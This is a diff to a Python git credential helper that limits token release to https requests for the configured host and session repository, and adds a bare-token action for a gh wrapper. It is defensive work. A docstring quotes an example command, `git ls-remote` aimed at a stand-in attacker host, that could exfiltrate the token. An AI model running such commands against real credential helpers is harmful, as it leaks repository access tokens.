@@ -109,18 +109,65 @@ def _credentials_from_env() -> dict[str, object] | None:
     }
 
 
-def _is_authorized_host(input_lines: dict[str, str]) -> bool:
-    """Return True iff git is asking about our configured SCM host.
+def _normalize_repo_path(path: str) -> str:
+    """Normalize a git credential `path=` value to ``owner/repo`` form."""
+    normalized = path.strip().strip("/").lower()
+    if normalized.endswith(".git"):
+        normalized = normalized[: -len(".git")]
+    return normalized
 
-    The system-wide credential helper would otherwise hand the SCM token to
-    any host git resolves — a malicious submodule URL or `git ls-remote
+
+def _expected_repo_path() -> str | None:
+    """Return the session repo as ``owner/repo``, or None if not configured."""
+    owner = os.environ.get("REPO_OWNER", "").strip().lower()
+    name = os.environ.get("REPO_NAME", "").strip().lower()
+    if not owner or not name:
+        return None
+    return f"{owner}/{name}"
+
+
+def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
+    """Decide whether to serve credentials for this credential request.
+
+    The system-wide helper would otherwise hand the SCM token to any host
+    git resolves — a malicious submodule URL or `git ls-remote
     https://attacker.example/...` could exfiltrate the installation token.
+    We scope on three axes:
+
+    * protocol must be ``https`` (never hand a token to a plaintext remote);
+    * host must equal the configured ``VCS_HOST``;
+    * path, when git provides it (``credential.useHttpPath=true``), must be
+      the session repo. If git doesn't pass a path we fall back to host-only
+      scoping and flag it — that only happens on a misconfigured image where
+      ``useHttpPath`` wasn't applied.
+
+    Returns ``(authorized, reason)`` so the caller can log the rejection.
     """
+    protocol = input_lines.get("protocol", "").strip().lower()
+    if protocol != "https":
+        return False, f"protocol={protocol!r} is not https"
+
     requested_host = input_lines.get("host", "").strip().lower()
     if not requested_host:
-        return False
+        return False, "no host provided"
     expected_host = os.environ.get("VCS_HOST", "github.com").strip().lower()
-    return requested_host == expected_host
+    if requested_host != expected_host:
+        return False, f"host={requested_host!r} (expected {expected_host!r})"
+
+    # Path is mandatory: we configure credential.useHttpPath=true wherever the
+    # helper is installed, so git always passes it. A missing path means a
+    # misconfigured image — fail closed rather than fall back to host-only
+    # scoping, which would re-open the same-host leak.
+    requested_path = input_lines.get("path", "").strip()
+    if not requested_path:
+        return False, "no path provided (credential.useHttpPath unset?)"
+    expected_path = _expected_repo_path()
+    if expected_path is None:
+        return False, "REPO_OWNER/REPO_NAME not configured"
+    if _normalize_repo_path(requested_path) != expected_path:
+        return False, f"path={requested_path!r} (expected {expected_path!r})"
+
+    return True, ""
 
 
 def _read_cached() -> dict[str, object] | None:
@@ -229,9 +276,31 @@ def _emit_response(input_lines: dict[str, str], credentials: dict[str, object]) 
     sys.stdout.flush()
 
 
+def _print_token() -> int:
+    """Print just the password (token) for the gh CLI wrapper.
+
+    Unlike the git `get` action this takes no protocol input and does no
+    host/path scoping — the gh wrapper has already checked the SCM host, and
+    the token returned is the same installation token regardless of repo.
+    Prints nothing and exits non-zero if no credential is available.
+    """
+    try:
+        credentials = _get_credentials()
+    except Exception as e:
+        _log(f"failed to obtain token: {e}")
+        return 1
+    sys.stdout.write(str(credentials["password"]))
+    sys.stdout.flush()
+    return 0
+
+
 def main(argv: list[str] | None = None) -> int:
     args = list(argv if argv is not None else sys.argv[1:])
     action = args[0] if args else "get"
+
+    # `token` is for the gh CLI wrapper; emit the bare token.
+    if action == "token":
+        return _print_token()
 
     # We only mint credentials on `get`. `store` and `erase` are no-ops:
     # the control plane owns the truth and we don't persist anything git tells us.
@@ -243,14 +312,13 @@ def main(argv: list[str] | None = None) -> int:
 
     input_lines = _read_protocol_input(sys.stdin)
 
-    # Host-scoping: never hand the SCM token to a host other than the one
-    # this sandbox was configured for. git accepts an empty response as
-    # "I have nothing", which is the right behaviour here — fall through
-    # to any other configured helper, otherwise fail the auth cleanly.
-    if not _is_authorized_host(input_lines):
-        requested = input_lines.get("host", "<unknown>")
-        expected = os.environ.get("VCS_HOST", "github.com")
-        _log(f"refusing to serve credentials for host={requested!r} (expected {expected!r})")
+    # Scope the request to the session repo over https on the configured
+    # host. git treats an empty response as "I have nothing", so returning
+    # 0 with no output lets it fall through to any other helper or fail the
+    # auth cleanly — without us ever emitting the token to the wrong place.
+    authorized, reason = _is_authorized_request(input_lines)
+    if not authorized:
+        _log(f"refusing to serve credentials: {reason}")
         return 0
 
     try:
